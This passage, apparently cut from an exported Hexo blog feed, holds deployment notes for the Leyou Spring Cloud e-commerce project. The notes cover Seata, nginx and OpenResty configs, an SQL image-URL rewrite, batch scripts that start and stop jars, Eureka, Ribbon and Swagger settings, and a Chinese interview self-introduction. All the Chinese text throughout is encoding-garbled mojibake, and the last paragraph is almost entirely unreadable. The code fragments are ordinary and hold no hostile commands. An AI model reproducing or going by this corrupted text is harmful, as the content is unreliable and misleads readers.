class="line"><span class="meta">  # </span><span class="language-bash">file ã€nacos ã€eurekaã€redisã€zkã€consulã€etcd3ã€sofa</span></span><br><span class="line">  type = &quot;eureka&quot;</span><br><span class="line">  loadBalance = &quot;RandomLoadBalance&quot;</span><br><span class="line">  loadBalanceVirtualNodes = 10</span><br><span class="line">  eureka &#123;</span><br><span class="line"><span class="meta">  	# </span><span class="language-bash">seata-server æ³¨å†Œåˆ°è¿™ä¸ªæ³¨å†Œä¸­å¿ƒ</span></span><br><span class="line">    serviceUrl = &quot;http://registry.wl9939.top/eureka&quot;</span><br><span class="line">    # seataâ€”server åœ¨æ³¨å†Œä¸­å¿ƒçš„åå­—</span><br><span class="line">    application = &quot;seata_service&quot;</span><br><span class="line">    weight = &quot;1&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta"># </span><span class="language-bash">ä½¿ç”¨æ–‡ä»¶æ–¹å¼é…ç½®seata</span></span><br><span class="line">config &#123;</span><br><span class="line"><span class="meta">  # </span><span class="language-bash">fileã€nacos ã€apolloã€zkã€consulã€etcd3</span></span><br><span class="line">  type = &quot;file&quot;</span><br><span class="line">  file &#123;</span><br><span class="line">    name = &quot;file.conf&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">vi file.conf</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash"><span class="comment"># transaction log store, only used in seata-server</span></span></span><br><span class="line">store &#123;</span><br><span class="line"><span class="meta">  #</span><span class="language-bash"><span class="comment"># store mode: fileã€dbã€redis</span></span></span><br><span class="line">  mode = &quot;file&quot;</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">  #</span><span class="language-bash"><span class="comment"># file store property</span></span></span><br><span class="line">  file &#123;</span><br><span class="line">    ## store location dir</span><br><span class="line">    dir = &quot;sessionStore&quot;</span><br><span class="line">    # branch session size , if exceeded first try compress lockkey, still exceeded throws exceptions</span><br><span class="line">    maxBranchSessionSize = 16384</span><br><span class="line">    # globe session size , if exceeded throws exceptions</span><br><span class="line">    maxGlobalSessionSize = 512</span><br><span class="line">    # file buffer size , if exceeded allocate new buffer</span><br><span class="line">    fileWriteBufferCacheSize = 16384</span><br><span class="line">    # when recover batch read size</span><br><span class="line">    sessionReloadReadSize = 100</span><br><span class="line">    # async, sync</span><br><span class="line">    flushDiskMode = async</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">netstat -anp|grep 8091</span><br><span class="line">kill -9 </span><br><span class="line">cd</span><br><span class="line">cd seata/bin</span><br><span class="line"><span class="meta"># </span><span class="language-bash">åå°è¿è¡Œ</span></span><br><span class="line">nohup ./seata-server.sh -h 192.168.58.154 -p 8091 &gt;log.out 2&gt;1 &amp;</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">ä»£è¡¨åœ¨æ³¨å†Œä¸­å¿ƒæ³¨å†Œçš„åœ°å€ å‰å°è¿è¡Œ</span></span><br><span class="line">./seata-server.sh -h  -p 8091</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="å¾®æœåŠ¡"><a href="#å¾®æœåŠ¡" class="headerlink" title="å¾®æœåŠ¡"></a>å¾®æœåŠ¡</h2><p>ä¿®æ”¹cookieè§„åˆ™(åœ¨ly-commonä¸­)</p>
<p>ä¿®æ”¹gatewayçš„è·¨åŸŸè®¿é—®</p>
<h2 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h2><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">        listen   80;</span><br><span class="line">        server_name www.wl9939.top;</span><br><span class="line">        location / &#123;</span><br><span class="line">        root  C:\Users\11253\WebstormProjects\leyou-portal;</span><br><span class="line">        &#125;</span><br><span class="line">        location /item &#123;</span><br><span class="line">                # æºå¸¦hostsåœ°å€ï¼Œé¿å…å› ä»£ç†å¯¼è‡´hostä¸¢å¤±</span><br><span class="line">                proxy_set_header Host       $host;</span><br><span class="line">						#openresty</span><br><span class="line">            proxy_pass   http://ly-resty;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">server &#123;</span><br><span class="line">        listen       80;</span><br><span class="line">        server_name  registry.wl9939.top;</span><br><span class="line"></span><br><span class="line">        location / &#123;</span><br><span class="line">                proxy_pass   http://ly-registry:10086;</span><br><span class="line">                proxy_connect_timeout 600;</span><br><span class="line">                proxy_read_timeout 5000;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">        listen       80;</span><br><span class="line">        server_name  api.wl9939.top;</span><br><span class="line">        location / &#123;</span><br><span class="line">                proxy_pass   http://ly-gateway:10010;</span><br><span class="line">                proxy_connect_timeout 600;</span><br><span class="line">                proxy_read_timeout 5000;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">        listen       80;</span><br><span class="line">        server_name  manage.wl9939.top;</span><br><span class="line">        location / &#123;</span><br><span class="line">                proxy_pass   http://ly-manage:9001;</span><br><span class="line">                proxy_connect_timeout 600;</span><br><span class="line">                proxy_read_timeout 5000;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Leyou-portal"><a href="#Leyou-portal" class="headerlink" title="Leyou-portal"></a>Leyou-portal</h2><p>ä¿®æ”¹åŸŸå</p>
<h2 id="leyou-manage"><a href="#leyou-manage" class="headerlink" title="leyou-manage"></a>leyou-manage</h2><p>ä¿®æ”¹åŸŸå</p>
<h2 id="æ•°æ®åº“"><a href="#æ•°æ®åº“" class="headerlink" title="æ•°æ®åº“"></a>æ•°æ®åº“</h2><p>image.leyou.comä¿®æ”¹ä¸ºimage.wl9939.top</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> tb_sku</span><br><span class="line"><span class="keyword">set</span> images<span class="operator">=</span>REPLACE(images,images,concat(<span class="string">&#x27;http://image.wl9939.top/&#x27;</span>,<span class="built_in">SUBSTRing</span>(images <span class="keyword">from</span> <span class="number">24</span> <span class="keyword">FOR</span> LENGTH(images))))</span><br><span class="line"><span class="keyword">where</span> images</span><br><span class="line"><span class="keyword">LIKE</span> <span class="string">&#x27;http://image.leyou.com%&#x27;</span></span><br></pre></td></tr></table></figure>

<h2 id="æ¸…ç©ºesæ•°æ®ï¼Œç„¶åé‡æ–°load"><a href="#æ¸…ç©ºesæ•°æ®ï¼Œç„¶åé‡æ–°load" class="headerlink" title="æ¸…ç©ºesæ•°æ®ï¼Œç„¶åé‡æ–°load"></a>æ¸…ç©ºesæ•°æ®ï¼Œç„¶åé‡æ–°load</h2><h2 id="é…ç½®openresty"><a href="#é…ç½®openresty" class="headerlink" title="é…ç½®openresty"></a>é…ç½®openresty</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash"><span class="comment">##openresty</span></span></span><br><span class="line">vi /etc/hosts</span><br><span class="line">åˆ é™¤é…ç½®é¡¹</span><br><span class="line"></span><br><span class="line">vi /usr/resty/conf/leyou.conf</span><br><span class="line"><span class="meta">#</span><span class="language-bash">www.wl9939.top:8084ä¸ºly-pageçš„åœ°å€</span> </span><br><span class="line">upstream backend &#123;</span><br><span class="line">    server www.wl9939.top:8084 max_fails=5 fail_timeout=10s weight=1;</span><br><span class="line">    keepalive 100;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">    listen       80;</span><br><span class="line">        set $template_root &quot;/usr/resty/templates&quot;;</span><br><span class="line"></span><br><span class="line">    location ~ /backend/(.*) &#123;</span><br><span class="line">        #internal;</span><br><span class="line">        keepalive_timeout   30s;</span><br><span class="line">        keepalive_requests  1000;</span><br><span class="line">        #æ”¯æŒkeep-alive</span><br><span class="line">        proxy_http_version 1.1;</span><br><span class="line">        proxy_set_header Connection &quot;&quot;;</span><br><span class="line"><span class="meta">  #</span><span class="language-bash">å°†è·¯å¾„é‡å†™ä¸ºç¬¬ä¸€ä¸ªæ­£åˆ™æ•è·åˆ°çš„è·¯å¾„  /xxx/xxx</span></span><br><span class="line">        rewrite /backend(/.*) $1 break;</span><br><span class="line">        proxy_pass_request_headers off;</span><br><span class="line">        #more_clear_input_headers Accept-Encoding;</span><br><span class="line">        proxy_next_upstream error timeout;</span><br><span class="line">        proxy_pass http://backend;</span><br><span class="line">    &#125;</span><br><span class="line">   location ~ /item/(\d+).html$ &#123;</span><br><span class="line">    # è·å–è·¯å¾„å‚æ•°</span><br><span class="line">    set $spuId $1;</span><br><span class="line">    # ç¦æ­¢é™¤äº†www.wl9939.topä»¥å¤–çš„è¯·æ±‚è®¿é—®</span><br><span class="line">    if ($host !~ &quot;^www\.wl9939\.top$&quot;) &#123;</span><br><span class="line">        return 403;</span><br><span class="line">    &#125;</span><br><span class="line">    # å…³é—­ç¼“å­˜/æ‰“å¼€ç¼“å­˜</span><br><span class="line">    lua_code_cache on;</span><br><span class="line">    default_type &#x27;text/html&#x27;;</span><br><span class="line">    charset utf-8;</span><br><span class="line">    # æŒ‡å®šè¯·æ±‚äº¤ç»™lua/item.luaè„šæœ¬æ¥å¤„ç†</span><br><span class="line">    content_by_lua_file lua/item.lua;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cd /usr/resty/templates</span><br><span class="line">vi item.html</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">é‡å¯nginx</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">é‡å¯</span></span><br><span class="line">cd /usr/resty</span><br><span class="line">nginx -p `pwd`/ -c conf/nginx.conf</span><br><span class="line"><span class="meta"># </span><span class="language-bash">å…ˆå¯åŠ¨æ‰èƒ½reload</span></span><br><span class="line">nginx -p `pwd` -c conf/nginx.conf -s reload</span><br><span class="line"></span><br><span class="line">å¯èƒ½æ˜¯dnsé—®é¢˜ï¼Œæ— æ³•è®¿é—®</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>centosè¿ä¸ä¸Šå®¿ä¸»æœº8084ç«¯å£ï¼Œä¸€ç›´å¤„äºsyn_sentçŠ¶æ€</p>
<p><strong>å› ä¸ºå½“æ—¶æŠŠpageæœåŠ¡è·‘åœ¨äº†macï¼ˆ192.168.58.153ï¼‰ä¸Šï¼Œæ‰€ä»¥è¿™é‡Œä¼šè®¿é—®ä¸åˆ°</strong>ï¼Œä¸€ç›´å¤„äºsyn_sentçŠ¶æ€ï¼ˆè€—æ—¶åŠå¤©ï¼‰</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212149307.png" alt="image-20210627011101095"></p>
<h2 id="é…ç½®seata-h-ï¼Œgraylogsæ–°ipé‡å¯"><a href="#é…ç½®seata-h-ï¼Œgraylogsæ–°ipé‡å¯" class="headerlink" title="é…ç½®seata -h ï¼Œgraylogsæ–°ipé‡å¯"></a>é…ç½®seata -h ï¼Œgraylogsæ–°ipé‡å¯</h2><h2 id="å¯åŠ¨jaråŒ…"><a href="#å¯åŠ¨jaråŒ…" class="headerlink" title="å¯åŠ¨jaråŒ…"></a>å¯åŠ¨jaråŒ…</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">å¤–éƒ¨é…ç½®æ–‡ä»¶å¯åŠ¨</span></span><br><span class="line">nohup java -jar -Dspring.config.location=./application.properties online_xdclass-0.0.1-SNAPSHOT.jar &amp;</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">å¯åŠ¨jarè„šæœ¬</span></span><br><span class="line">@echo off</span><br><span class="line">START &quot;app&quot; javaw -jar app-0.0.1-SNAPSHOT.jar</span><br><span class="line"><span class="meta">#</span><span class="language-bash">åœæ­¢jarè„šæœ¬(å¦‚ï¼šjaråŒ…ç«¯å£9090)</span></span><br><span class="line">@echo off</span><br><span class="line">set port=9090</span><br><span class="line">for /f &quot;tokens=1-5&quot; %%i in (&#x27;netstat -ano^|findstr &quot;:%port%&quot;&#x27;) do (</span><br><span class="line"> echo kill the process %%m who use the port </span><br><span class="line"> taskkill /pid %%m -t -f</span><br><span class="line"> goto q</span><br><span class="line">)</span><br><span class="line">:q</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">é‡å¯jarè„šæœ¬(å°±æ˜¯ä¸Šé¢ä¸¤ä¸ªåˆèµ·æ¥)</span></span><br><span class="line">@echo off</span><br><span class="line">set port=9090</span><br><span class="line">for /f &quot;tokens=1-5&quot; %%i in (&#x27;netstat -ano^|findstr &quot;:%port%&quot;&#x27;) do (</span><br><span class="line"> echo kill the process %%m who use the port </span><br><span class="line"> taskkill /pid %%m -t -f</span><br><span class="line"> goto start</span><br><span class="line">)</span><br><span class="line">:start</span><br><span class="line">START &quot;app&quot; javaw -jar app-0.0.1-SNAPSHOT.jar</span><br><span class="line"></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"> #</span><span class="language-bash">æŠŠè¿™ä¸ªè„šæœ¬æ‹·è´åˆ°è‡ªå¯åŠ¨æ–‡ä»¶å¤¹ä¸‹</span>ã€€</span><br><span class="line"> C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp   ï¼ˆå¦‚æœæ˜¯è„šæœ¬å½¢å¼æ‹·è´ï¼Œè¦ä»¥ç®¡ç†å‘˜èº«ä»½è¿è¡Œï¼Œè´Ÿè´£æ‹·è´ä¸è¿›å»ï¼‰</span><br></pre></td></tr></table></figure>

<h2 id="æ³¨æ„äº‹é¡¹"><a href="#æ³¨æ„äº‹é¡¹" class="headerlink" title="æ³¨æ„äº‹é¡¹"></a>æ³¨æ„äº‹é¡¹</h2><p>pageå¿…é¡»åœ¨<a href="http://www.wl9939.top/">www.wl9939.top</a>, è¿™ä¸ªæœåŠ¡å™¨ä¸Š</p>
<h2 id="feign-RetryableException-Connection-refused-Connection-refused-executing"><a href="#feign-RetryableException-Connection-refused-Connection-refused-executing" class="headerlink" title="feign.RetryableException: Connection refused (Connection refused) executing"></a>feign.RetryableException: Connection refused (Connection refused) executing</h2><p>AæœåŠ¡è®¿é—®BæœåŠ¡æŠ¥é”™ï¼šfeign.RetryableException: Connection refused (Connection refused) executing</p>
<p>åŸå› ï¼šBæœåŠ¡æ³¨å†Œåˆ°Erekaçš„æ—¶å€™ï¼Œé»˜è®¤ä½¿ç”¨hostnameæ³¨å†Œï¼Œå¦‚æœæ²¡æœ‰æ‰¾åˆ°hostnameå°±ä¼šç”¨localhost</p>
<p>è§£å†³åŠæ³•ï¼šä½¿ç”¨ipæ³¨å†Œ</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">eureka:</span>	</span><br><span class="line">	<span class="attr">instance:</span></span><br><span class="line">  	<span class="attr">prefer-ip-address:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>

<h2 id="Read-time-out"><a href="#Read-time-out" class="headerlink" title="Read-time out"></a>Read-time out</h2><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">ribbon:</span></span><br><span class="line">  <span class="attr">ConnectTimeout:</span> <span class="number">9000</span> <span class="comment"># ribboné“¾æ¥è¶…æ—¶æ—¶é•¿,è®¾ç½®æ—¶é—´é•¿ä¸€ç‚¹å°±ä¸ä¼šè¶…æ—¶äº†</span></span><br><span class="line">  <span class="attr">ReadTimeout:</span> <span class="number">9000</span> <span class="comment"># ribbonè¯»å–è¶…æ—¶æ—¶é•¿</span></span><br></pre></td></tr></table></figure>

<h2 id="Springboot-æ•´åˆswagger"><a href="#Springboot-æ•´åˆswagger" class="headerlink" title="Springboot æ•´åˆswagger"></a>Springboot æ•´åˆswagger</h2><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.springfox<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>springfox-swagger2<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.9.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.springfox<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>springfox-swagger-ui<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.9.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@EnableSwagger2</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SwaggerConfig</span> &#123;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> Docket <span class="title function_">createRestApi</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// DocumentationType.SWAGGER_2 å›ºå®šçš„ï¼Œä»£è¡¨swagger2</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Docket</span>(DocumentationType.SWAGGER_2)</span><br><span class="line">                <span class="comment">// å¦‚æœé…ç½®å¤šä¸ªæ–‡æ¡£çš„æ—¶å€™ï¼Œé‚£ä¹ˆéœ€è¦é…ç½®groupNameæ¥åˆ†ç»„æ ‡è¯†</span></span><br><span class="line">                .groupName(<span class="string">&quot;åˆ†å¸ƒå¼ä»»åŠ¡ç³»ç»Ÿ&quot;</span>)</span><br><span class="line">                <span class="comment">// ç”¨äºç”ŸæˆAPIä¿¡æ¯</span></span><br><span class="line">                .apiInfo(apiInfo())</span><br><span class="line">                <span class="comment">// select()å‡½æ•°è¿”å›ä¸€ä¸ªApiSelectorBuilderå®ä¾‹,ç”¨æ¥æ§åˆ¶æ¥å£è¢«swaggeråšæˆæ–‡æ¡£</span></span><br><span class="line">                .select()</span><br><span class="line">                <span class="comment">// ç”¨äºæŒ‡å®šæ‰«æå“ªä¸ªåŒ…ä¸‹çš„æ¥å£</span></span><br><span class="line">                .apis(RequestHandlerSelectors.basePackage(<span class="string">&quot;com.leyou.sms.controller&quot;</span>))</span><br><span class="line">                <span class="comment">// é€‰æ‹©æ‰€æœ‰çš„API,å¦‚æœä½ æƒ³åªä¸ºéƒ¨åˆ†APIç”Ÿæˆæ–‡æ¡£ï¼Œå¯ä»¥é…ç½®è¿™é‡Œ</span></span><br><span class="line">                .paths(PathSelectors.any())</span><br><span class="line">                .build();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * ç”¨äºå®šä¹‰APIä¸»ç•Œé¢çš„ä¿¡æ¯ï¼Œæ¯”å¦‚å¯ä»¥å£°æ˜æ‰€æœ‰çš„APIçš„æ€»æ ‡é¢˜ã€æè¿°ã€ç‰ˆæœ¬</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> apiçš„åŸºæœ¬ä¿¡æ¯</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> ApiInfo <span class="title function_">apiInfo</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ApiInfoBuilder</span>()</span><br><span class="line">                <span class="comment">//  å¯ä»¥ç”¨æ¥è‡ªå®šä¹‰APIçš„ä¸»æ ‡é¢˜</span></span><br><span class="line">                .title(<span class="string">&quot;çŸ­ä¿¡æœåŠ¡API&quot;</span>)</span><br><span class="line">                <span class="comment">// å¯ä»¥ç”¨æ¥æè¿°æ•´ä½“çš„API</span></span><br><span class="line">                .description(<span class="string">&quot;çŸ­ä¿¡æœåŠ¡SwaggerAPIç®¡ç†&quot;</span>)</span><br><span class="line">                <span class="comment">// ç”¨äºå®šä¹‰æœåŠ¡çš„åŸŸå</span></span><br><span class="line">                .termsOfServiceUrl(<span class="string">&quot;&quot;</span>)</span><br><span class="line">                <span class="comment">// å¯ä»¥ç”¨æ¥å®šä¹‰ç‰ˆæœ¬ã€‚</span></span><br><span class="line">                .version(<span class="string">&quot;1.0.0&quot;</span>)</span><br><span class="line">                .build();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="åˆ¤æ–­ç«¯å£æ˜¯å¦å¯ä»¥pingé€š"><a href="#åˆ¤æ–­ç«¯å£æ˜¯å¦å¯ä»¥pingé€š" class="headerlink" title="åˆ¤æ–­ç«¯å£æ˜¯å¦å¯ä»¥pingé€š"></a>åˆ¤æ–­ç«¯å£æ˜¯å¦å¯ä»¥pingé€š</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">python -m SimpleHTTPServer 8080</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">ä¸å­˜åœ¨çš„ç«¯å£ç›´æ¥æ‹’ç»è¿æ¥ï¼ˆwindowsï¼‰</span></span><br><span class="line">telnet 10.0.250.3 80</span><br><span class="line"><span class="meta">#</span><span class="language-bash">linuxæœ€å¸¸ç”¨</span></span><br><span class="line">ssh 10.0.250.3 -p 80</span><br><span class="line"><span class="meta">#</span><span class="language-bash">ä½¿ç”¨wgetåˆ¤æ–­</span></span><br><span class="line">wget ip:port</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Leyou</category>
      </categories>
      <tags>
        <tag>Leyou</tag>
      </tags>
  </entry>
  <entry>
    <title>leyouå¸¸è§é—®é¢˜</title>
    <url>/2021/12/21/leyou/leyou%E9%9D%A2%E8%AF%95%E7%89%88/</url>
    <content><![CDATA[<h1 id="é¡¹ç›®é—®é¢˜"><a href="#é¡¹ç›®é—®é¢˜" class="headerlink" title="é¡¹ç›®é—®é¢˜"></a>é¡¹ç›®é—®é¢˜</h1><p>ä¹ä¼˜å•†åŸé‡‡ç”¨äº†å‰åç«¯åˆ†ç¦»çš„æ¶æ„æ–¹å¼ï¼Œ</p>
<ul>
<li>å‰ç«¯é‡‡ç”¨VueæŠ€æœ¯æ ˆï¼Œä»ä½¿ç”¨è€…çš„è§’åº¦ï¼Œåˆ†ä¸ºï¼š<ul>
<li>å‰å°é—¨æˆ·ç³»ç»Ÿï¼šæ”¯æŒH5</li>
<li>åå°ç®¡ç†ç³»ç»Ÿï¼šåŸºäºVueå®ç°çš„å•é¡µåº”ç”¨ï¼ˆSPAï¼‰ï¼Œå®ç°ç®¡ç†åŠŸèƒ½</li>
</ul>
</li>
<li>æœåŠ¡ç«¯é‡‡ç”¨SpringCloudæŠ€æœ¯æ ˆå½¢æˆå¾®æœåŠ¡é›†ç¾¤ï¼Œä¼šåŒ…æ‹¬ï¼š<ul>
<li>å•†å“å¾®æœåŠ¡ï¼šå•†å“åŠå•†å“åˆ†ç±»ã€å“ç‰Œã€åº“å­˜ç­‰çš„æœåŠ¡</li>
<li>æœç´¢å¾®æœåŠ¡ï¼šå®ç°æœç´¢åŠŸèƒ½</li>
<li>äº¤æ˜“å¾®æœåŠ¡ï¼šå®ç°è®¢å•ç›¸å…³ä¸šåŠ¡ã€å®ç°è´­ç‰©è½¦ç›¸å…³ä¸šåŠ¡</li>
<li>ç”¨æˆ·æœåŠ¡ï¼šç”¨æˆ·çš„ç™»å½•æ³¨å†Œã€ç”¨æˆ·ä¿¡æ¯ç®¡ç†ç­‰åŠŸèƒ½</li>
<li>çŸ­ä¿¡æœåŠ¡ï¼šå®Œæˆå„ç§çŸ­ä¿¡çš„å‘é€ä»»åŠ¡</li>
<li>æ”¯ä»˜æœåŠ¡ï¼šå¯¹æ¥å¾®ä¿¡æ”¯ä»˜å¹³å°</li>
<li>æˆæƒæœåŠ¡ï¼šå®Œæˆå¯¹ç”¨æˆ·çš„æˆæƒã€é‰´æƒç­‰åŠŸèƒ½</li>
</ul>
</li>
</ul>
<p>å¦‚æœæœ‰é¡¹ç›®çš„è¯ï¼ŒæŠ€æœ¯é¢è¯•ç¬¬ä¸€æ­¥ï¼Œé¢è¯•å®˜ä¸€èˆ¬éƒ½æ˜¯è®©ä½ è‡ªå·±ä»‹ç»ä¸€ä¸‹ä½ çš„é¡¹ç›®ã€‚ä½ å¯ä»¥ä»ä¸‹é¢</p>
<p>å‡ ä¸ªæ–¹å‘æ¥è€ƒè™‘:</p>
<ol>
<li><p>å¯¹é¡¹ç›®æ•´ä½“è®¾è®¡çš„ä¸€ä¸ªæ„Ÿå—(é¢è¯•å®˜å¯èƒ½ä¼šè®©ä½ ç”»ç³»ç»Ÿçš„æ¶æ„å›¾)</p>
</li>
<li><p>åœ¨è¿™ä¸ªé¡¹ç›®ä¸­ä½ è´Ÿè´£äº†ä»€ä¹ˆã€åšäº†ä»€ä¹ˆã€æ‹…ä»»äº†ä»€ä¹ˆâ»†è‰²</p>
</li>
<li><p>ä»è¿™ä¸ªé¡¹ç›®ä¸­ä½ å­¦ä¼šäº†é‚£äº›ä¸œâ»„ï¼Œä½¿ç”¨åˆ°äº†é‚£äº›æŠ€æœ¯ï¼Œå­¦ä¼šäº†é‚£äº›æ–°æŠ€æœ¯çš„ä½¿ç”¨</p>
</li>
<li><p>å¦å¤–é¡¹ç›®æè¿°ä¸­ï¼Œæœ€å¥½å¯ä»¥ä½“ç°è‡ªå·±çš„ç»¼åˆç´ è´¨ï¼Œæ¯”å¦‚ä½ æ˜¯å¦‚ä½•åè°ƒé¡¹ç›®ç»„æˆå‘˜ååŒå¼€å‘çš„</p>
<p>æˆ–è€…åœ¨é‡åˆ°æŸä¸€ä¸ªæ£˜æ‰‹çš„é—®é¢˜çš„æ—¶å€™ä½ æ˜¯å¦‚ä½•è§£å†³çš„åˆæˆ–è€…è¯´ä½ åœ¨è¿™ä¸ªé¡¹ç›®ç”¨äº†ä»€ä¹ˆæŠ€æœ¯å® ç°äº†ä»€ä¹ˆåŠŸèƒ½æ¯”å¦‚:ç”¨redisåšç¼“å­˜æé«˜è®¿é—®é€Ÿåº¦å’Œå¹¶å‘é‡ã€ä½¿ç”¨æ¶ˆæ¯é˜Ÿåˆ—å‰Šå³°å’Œé™æµç­‰ç­‰ã€‚</p>
</li>
</ol>
<p>é¢è¯•å®˜ï¼Œæ‚¨å¥½!æˆ‘å«ç§€å„¿ã€‚ç ”ç©¶ç”ŸæœŸé—´æ—¶é—´æˆ‘ä¸»è¦åˆ©ç”¨è¯¾å¤–æ—¶é—´å­¦ä¹ äº† Java ä»¥åŠ jvm, mysql, redisç­‰æ¡†æ¶ ã€‚åœ¨æ ¡æœŸé—´å‚ä¸è¿‡ä¸€ä¸ªB2Cçš„ç±»äº¬ä¸œçš„ç”µå•†ç½‘ç«™çš„å¼€å‘ï¼Œä¹è´­ç”Ÿæ´»é¡¹ç›®æ˜¯é‡‡ç”¨åˆ†å¸ƒå¼æœåŠ¡ç³»ç»Ÿæ¶æ„æ‰“é€ çš„ B2C æ¨¡å¼çš„ç”µå•†ç½‘ç«™,æ•´ä¸ªé¡¹ç›®åˆ†ä¸ºè¿è¥å•†å®¶åå°ç®¡ç†ç³»ç»Ÿã€é—¨æˆ·ç½‘ ç«™ä¸¤ä¸ªå­ç³»ç»Ÿ.é¡¹ç›®é‡‡ç”¨å¾®æœåŠ¡æ¶æ„,å‰åç«¯åˆ†ç¦»,å¾®æœåŠ¡æŠ€æœ¯é‡‡ç”¨äº†Spring Cloud æŠ€æœ¯æ ˆ,å„ä¸ªå¾®æœåŠ¡ç«™ç‚¹åŸºäº Spring Boot æ„ å»º.å„ä¸ªå¾®æœåŠ¡ä¹‹é—´é‡‡ç”¨RabbitMQ å®ç°å¼‚æ­¥é€šä¿¡,é™ä½ç³»ç»Ÿä¹‹é—´çš„è€¦åˆåº¦,æé«˜äº†ç³»ç»Ÿçš„æ‰©å±•æ€§ä»¥åŠéƒ¨ç½²çš„çµæ´»æ€§.ä½¿ç”¨Redis åš ç³»ç»Ÿç¼“å­˜,æé«˜ç³»ç»Ÿçš„æ€§èƒ½,çƒ­ç‚¹é¡µé¢é‡‡ç”¨äº† openresty é¡µé¢é™æ€åŒ–æŠ€æœ¯. ç”Ÿæ´»ä¸­æˆ‘æ˜¯ä¸€ä¸ªæ¯”ô°€ç§¯æä¹è§‚çš„äººï¼Œä¸€èˆ¬ä¼šé€šè¿‡è·‘æ­¥å¥èº«çš„æ–¹å¼æ¥æ”¾æ¾ã€‚æˆ‘ ä¸€ç›´éƒ½éå¸¸æƒ³åŠ å…¥è´µå…¬å¸ï¼Œæˆ‘è§‰å¾—è´µå…¬å¸çš„æ–‡åŒ–å’ŒæŠ€æœ¯æ°›å›´æˆ‘éƒ½éå¸¸å–œæ¬¢ï¼ŒæœŸå¾…èƒ½ä¸ä½ å…±äº‹;</p>
